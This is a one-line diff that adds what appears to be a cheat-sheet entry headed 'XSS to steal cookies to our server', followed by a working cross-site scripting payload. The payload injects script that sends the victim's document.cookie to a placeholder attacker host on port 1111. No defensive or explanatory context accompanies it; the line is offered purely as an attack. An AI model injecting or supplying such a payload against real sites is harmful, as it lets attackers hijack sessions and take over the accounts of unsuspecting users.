@@ -1,0 +1,1 @@
+XSS to steal cookies to our server : <script>new Image().src="http://ourinternalip:1111/page.php?output="+document.cookie;</script>
